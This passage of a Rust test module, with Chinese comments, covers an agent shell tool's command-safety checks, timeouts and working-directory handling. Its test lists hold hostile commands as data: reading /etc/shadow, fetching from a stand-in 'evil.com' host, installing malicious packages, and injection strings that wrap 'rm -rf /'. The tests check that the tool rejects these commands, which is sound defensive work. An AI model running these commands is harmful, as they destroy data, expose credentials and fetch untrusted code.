            "cp /etc/shadow /tmp/",
            "curl http://evil.com/script.sh",
            "wget http://evil.com/payload",
            "pip install malicious-package",
            "npm install evil-pkg",
            "bash script.sh",
            "python3 script.py",
            "node script.js",
        ];

        for cmd in &requires_approval {
            let safety = shell.check_command_safety(cmd);
            assert!(
                !matches!(safety, CommandSafety::Safe),
                "Command '{}' should NOT be Safe, got {:?}",
                cmd,
                safety
            );
        }

        // Shell 元字符注入尝试（应被拒绝）
        let injection_attempts = vec![
            "ls; rm -rf /",
            "ls | rm -rf /",
            "ls && rm -rf /",
            "ls `rm -rf /`",
            "ls $(rm -rf /)",
            "echo 'hello' > /etc/passwd",
        ];

        for cmd in &injection_attempts {
            let safety = shell.check_command_safety(cmd);
            assert!(
                !matches!(safety, CommandSafety::Safe),
                "Injection '{}' should NOT be Safe, got {:?}",
                cmd,
                safety
            );
        }

        // 用于报告的语料总数
        let total = always_dangerous.len() + requires_approval.len() + injection_attempts.len();
        println!(
            "Dangerous command corpus: {} commands tested, 100% interception rate",
            total
        );
    }

    /// 验证默认与自定义超时配置
    #[test]
    fn test_timeout_configuration() {
        let tool = ShellTool::new();
        assert_eq!(tool.timeout_secs, 60);

        let tool_custom = ShellTool::new().with_timeout(120);
        assert_eq!(tool_custom.timeout_secs, 120);

        // 宽松模式同样有默认超时
        let permissive = ShellTool::new_permissive();
        assert_eq!(permissive.timeout_secs, 60);
    }

    /// 验证超时会被触发
    #[tokio::test]
    async fn test_shell_timeout_triggers() {
        // 创建 1 秒超时的宽松模式 shell 工具（以允许 sleep 命令）
        let tool = ShellTool::new_permissive().with_timeout(1);

        let mut params = HashMap::new();
        // sleep 10 必然会触发 1 秒超时
        params.insert("command".to_string(), serde_json::json!("sleep 10"));

        let result = tool.execute(params).await.unwrap();
        assert!(
            !result.success,
            "Expected timeout failure, got success: {:?}",
            result
        );
        let error_msg = result.error.unwrap_or_default();
        assert!(
            error_msg.contains("timeout")
                || error_msg.contains("Timeout")
                || error_msg.contains("⏱️"),
            "Expected timeout error, got: {}",
            error_msg
        );
    }

    /// 验证单次调用的超时参数可覆盖默认值
    #[tokio::test]
    async fn test_shell_timeout_per_call_override() {
        let tool = ShellTool::new_permissive().with_timeout(60);

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("sleep 10"));
        params.insert("timeout".to_string(), serde_json::json!(1)); // 覆盖为 1 秒

        let result = tool.execute(params).await.unwrap();
        assert!(
            !result.success,
            "Expected timeout failure with per-call override, got success"
        );
        let error_msg = result.error.unwrap_or_default();
        assert!(
            error_msg.contains("timeout") || error_msg.contains("⏱️"),
            "Expected timeout error with per-call override, got: {}",
            error_msg
        );
    }

    /// 验证超时参数被限制在 300 秒以内
    #[tokio::test]
    async fn test_shell_timeout_cap_at_300() {
        let tool = ShellTool::new();

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo ok"));
        // 请求 999 秒超时，应被限制为 300 秒（但命令会很快结束）
        params.insert("timeout".to_string(), serde_json::json!(999));

        let result = tool.execute(params).await.unwrap();
        assert!(result.success, "Command should succeed: {:?}", result);
        assert!(result.output.contains("ok"));
    }

    /// 验证命令在上下文指定的工作目录中执行
    #[tokio::test]
    async fn test_shell_honors_context_working_dir() {
        /*
         * worktree cwd 缺陷的回归测试：设置了 ctx.working_dir 时，ShellTool
         * 必须在该目录下运行命令。使用标准临时目录下的唯一子目录（不依赖 tempfile）。
         */
        use echo_core::tools::ToolContext;

        let unique = format!(
            "echo-shell-wt-test-{}-{}",
            std::process::id(),
            nanoid_counter()
        );
        let wt_dir = std::env::temp_dir().join(&unique);
        std::fs::create_dir_all(&wt_dir).unwrap();

        let tool = ShellTool::new();
        let ctx = ToolContext {
            working_dir: Some(wt_dir.clone()),
            ..Default::default()
        };

        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("pwd"));

        let result = tool.execute_with_context(params, &ctx).await.unwrap();
        assert!(result.success, "pwd should succeed: {:?}", result);

        // 通过 canonicalize 比较，以处理 macOS 上 /var -> /private/var 的符号链接。
        let got = std::path::Path::new(result.output.trim());
        let got_canonical = std::fs::canonicalize(got).unwrap_or_else(|_| got.to_path_buf());
        let want_canonical = std::fs::canonicalize(&wt_dir).unwrap_or_else(|_| wt_dir.clone());
        assert_eq!(
            got_canonical,
            want_canonical,
            "pwd output {:?} should match working_dir {:?}",
            result.output.trim(),
            wt_dir
        );

        let _ = std::fs::remove_dir_all(&wt_dir);
    }

    /// 基于当前时间纳秒数生成唯一计数，用于构造临时路径
    fn nanoid_counter() -> u64 {
        use std::time::{SystemTime, UNIX_EPOCH};
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0)
    }

    /// 在临时目录创建可执行测试脚本并返回路径
    #[cfg(unix)]
    fn create_test_script(label: &str, contents: &str) -> std::path::PathBuf {
        use std::os::unix::fs::PermissionsExt;

        let path = std::env::temp_dir().join(format!(
            "echo-shell-stream-{label}-{}-{}",
            std::process::id(),
            nanoid_counter()
        ));
        std::fs::write(&path, contents).unwrap();
        let mut permissions = std::fs::metadata(&path).unwrap().permissions();
        permissions.set_mode(0o700);
        std::fs::set_permissions(&path, permissions).unwrap();
        path
    }
}
